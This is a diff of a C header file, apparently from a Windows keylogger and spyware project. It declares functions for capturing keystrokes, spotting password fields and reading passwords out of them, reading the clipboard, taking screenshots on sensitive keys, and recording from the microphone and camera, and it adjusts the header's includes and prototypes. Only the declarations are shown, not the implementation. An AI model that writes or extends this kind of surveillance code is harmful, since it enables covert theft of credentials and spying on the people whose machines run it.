@@ -1,15 +1,14 @@
 #ifndef WINKEY_H
 #define WINKEY_H
 
-#include <unistd.h>
+#define _CRT_SECURE_NO_WARNINGS
+#include <windows.h>
 #include <stdio.h>
 #include <stdlib.h>
 #include <tlhelp32.h>
-#include <windows.h>
 #include <psapi.h>
 #include <winternl.h>
-#include <mmdeviceapi.h>
-#include <audioclient.h>
+#include <processthreadsapi.h>
 #include <mfapi.h>
 #include <mfidl.h>
 #include <mfreadwrite.h>
@@ -21,39 +20,19 @@
 #pragma comment(lib, "mfreadwrite.lib")
 #pragma comment(lib, "mfuuid.lib")
 
+#ifdef __cplusplus
+extern "C" 
+{
+#endif
 
 extern volatile int g_camera_run;
+extern volatile int g_micro_run;
 
-typedef struct _RTL_USER_PROCESS_PARAMETERS 
-{
-	BYTE           Reserved1[16];
-	PVOID          Reserved2[10];
-	UNICODE_STRING ImagePathName;
-	UNICODE_STRING CommandLine;
-} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;
-
-typedef struct _PEB 
-{
-	BYTE                          Reserved1[2];
-	BYTE                          BeingDebugged;
-	BYTE                          Reserved2[1];
-	PVOID                         Reserved3[2];
-	PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
-} PEB, *PPEB;
-
-#ifdef _M_X64
-PPEB GetPEB(void) 
-{
-	return (PPEB)__readgsqword(0x60);
-}
-#else
-PPEB GetPEB(void) 
-{
-	return (PPEB)__readfsdword(0x30);
+#ifdef __cplusplus
 }
 #endif
 
-
+PPEB GetPEB(void);
 int vk_to_char(DWORD vkCode, char *out);
 void get_time(char *buf);
 char *special_touch(DWORD vk);
@@ -66,11 +45,12 @@ int capture_screen(LPCWSTR path);
 void on_special_event(void);
 void screenshot_on_sensitive_key(DWORD vk, DWORD modifiers);
 int is_password_field(HWND hwnd);
-int *allow_app(char *exe);
+int allow_app(char *exe);
 void read_clipboard(char *buffer, size_t size);
+int is_sensitive_key(DWORD vk);
 
 void capture_micro(void);
-int read_password_from_control(HWND hEdit, char *out, size_t out_size)
+int read_password_from_control(HWND hEdit, char *out, size_t out_size);
 int start_camera(void);
 
 #endif
